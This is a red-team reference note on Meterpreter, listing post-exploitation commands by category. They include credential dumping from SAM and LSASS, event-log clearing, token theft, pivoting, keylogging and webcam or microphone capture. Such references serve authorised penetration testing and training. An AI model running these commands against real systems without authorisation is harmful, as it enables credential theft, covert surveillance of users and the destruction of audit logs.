Tags: #Status/In-Progress #Type/Tool #Context/Linux #Context/Redteam

---
## Overview
Meterpreter is an advanced Metasploit payload that runs entirely in memory on the target system — no files are written to disk. It communicates over an encrypted TLS channel, making it harder for IPS/IDS systems to detect and inspect. Once a Meterpreter session is established, a wide range of post-exploitation capabilities are available: file system access, privilege escalation, credential dumping, lateral movement, surveillance, and extension loading. Meterpreter sessions are opened from [[MSFConsole]] and managed from within the active session prompt.

## Target / Context
Post-exploitation on compromised Windows or Linux targets. Delivered as a staged or stageless payload via [[MSFVenom]] or directly through an exploit module in [[MSFConsole]]. Part of the [[Metasploit]] framework.

---
## Installation

> [!INFO]- Installation Commands:
> Meterpreter is a payload — it is deployed to the target, not installed locally.
> It is included with Metasploit Framework: `sudo apt install metasploit-framework`
>
> Meterpreter sessions are opened automatically when an exploit using a Meterpreter payload succeeds.
> Interact with an existing session: `sessions -i <number>`

---
## Basic Usage

> [!INFO]- Basic Usage:
> Once inside a Meterpreter session:
> `sysinfo` — identify OS, hostname, and architecture
> `getuid` — confirm current user context
> `getpid` — get the PID of the Meterpreter process
> `help` — list all available Meterpreter commands

---
## Flags & Options

> [!INFO]- Flags & Options:
> Meterpreter uses interactive commands rather than CLI flags.
> All commands are run from within an active Meterpreter session prompt (`meterpreter >`).

---
## Common Use Cases

### Core Session Commands

> [!INFO]- Commands:
> `background` — send session to background; return to MSFConsole (also `CTRL+Z`)
> `sessions` — list all active sessions from MSFConsole
> `sessions -i <number>` — return to a backgrounded session
> `exit` — terminate the Meterpreter session
> `guid` — display the session's globally unique identifier
> `migrate <PID>` — move Meterpreter into another running process
> `load <extension>` — load a Meterpreter extension (e.g., kiwi, python)
> `run <script or post module>` — execute a Meterpreter script or post module
>
> `migrate` use cases: gain stability if the initial process is likely to terminate; move to a process with higher privileges; move to `explorer.exe` or `svchost.exe` to blend in.

---

### File System Commands

> [!INFO]- Commands:
> `ls` / `dir` — list directory contents
> `pwd` — print current remote working directory
> `cd <path>` — change remote directory
> `cat <file>` — display file contents
> `edit <file>` — open file in an editor
> `rm <file>` — delete a file
> `search -f <filename>` — search for a file by name across the filesystem
> `upload <local file> <remote path>` — upload a file to the target
> `download <remote file>` — download a file from the target
> `lcd <path>` — change local working directory
> `lpwd` — print local working directory

---

### Networking Commands

> [!INFO]- Commands:
> `arp` — display the ARP cache (reveals other hosts on the network)
> `ifconfig` — list network interfaces and IP addresses
> `netstat` — display active network connections and listening ports
> `portfwd add -l <local port> -p <remote port> -r <remote IP>` — forward a local port to a remote service
> `route` — view or modify the routing table
>
> `portfwd` is used to pivot — forward traffic through the compromised host to access internal services not directly reachable from the attacker's machine.

---

### System Commands

> [!INFO]- Commands:
> `sysinfo` — display OS name, hostname, architecture, and Meterpreter version
> `getuid` — show current user (e.g., `NT AUTHORITY\SYSTEM`)
> `getpid` — show the PID of the current Meterpreter process
> `ps` — list all running processes with PID, name, user, and path
> `kill <PID>` — terminate a process by PID
> `pkill <name>` — terminate a process by name
> `execute -f <command>` — run a command on the target
> `shell` — drop into a system command shell; press `CTRL+Z` to return to Meterpreter
> `getsystem` — attempt automated privilege escalation to SYSTEM
> `hashdump` — dump the Windows SAM database (local user password hashes)
> `clearev` — clear Windows event logs (Application, System, Security)
> `reboot` — reboot the target system
> `shutdown` — shut down the target system
>
> `hashdump` requires SYSTEM privileges — migrate to `lsass.exe` first, or use `getsystem` to escalate.
> `getsystem` attempts several escalation techniques automatically; may fail if the system is hardened.
> `shell` gives a native OS shell. Type `exit` to close it and return to Meterpreter.
> `steal_token <PID>` — impersonate the access token of a running process; useful for taking on the privilege context of a higher-privileged user without migrating into their process. Run `ps` first to find an appropriate PID.

---

### Surveillance Commands

> [!INFO]- Commands:
> `idletime` — show how long the user has been idle
> `screenshot` — capture a screenshot of the active desktop
> `screenshare` — stream the live desktop to your browser
> `record_mic` — record audio from the microphone
> `webcam_list` — list available webcams
> `webcam_snap` — capture a photo from the webcam
> `webcam_stream` — stream live video from the webcam
> `keyscan_start` — start keylogging
> `keyscan_dump` — dump captured keystrokes
> `keyscan_stop` — stop keylogging
>
> `keyscan_start` requires migrating to the target user's process first (e.g., explorer.exe) — otherwise keystrokes from the correct session won't be captured.

---

### Extensions

> [!INFO]- Commands:
> Load an extension: `load <name>`
> Show new commands added: `help`
>
> **Kiwi** (Mimikatz integration for Windows credential dumping):
> `load kiwi`
> `creds_all` — dump all credential types
> `lsa_dump_sam` — dump SAM database
> `lsa_dump_secrets` — dump LSA secrets
>
> **Python** (run Python in the context of the target):
> `load python`
> `python_execute "<code>"` — execute a Python one-liner
> `python_import <file>` — import and run a Python script
> `python_reset` — reset the Python interpreter state

---

### Post-Exploitation Modules
Run post modules directly from within a Meterpreter session or from MSFConsole with `SESSION` set.

> [!INFO]- Commands:
> From MSFConsole:
> `use post/linux/gather/hashdump`
> `set SESSION 1`
> `run`
>
> Convert a basic shell session to Meterpreter:
> `use post/multi/manage/shell_to_meterpreter`
> `set SESSION 1`
> `run`
>
> Identify local privilege escalation paths on the current session:
> `use post/multi/recon/local_exploit_suggester`
> `set SESSION 1`
> `run`
> — Scans the target against known local exploits for the current OS and architecture. Not all suggestions will work; run each candidate and try the next if it fails.
>
> Windows credential targeting:
> Migrate to `lsass.exe` → `hashdump` or `load kiwi` → `creds_all`

---
## Related Techniques
-

## Related Playbooks
- [[Red Team]]

---
## References / Images
- LSASS Memory and hashdump context: https://redcanary.com/threat-detection-report/techniques/lsass-memory/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
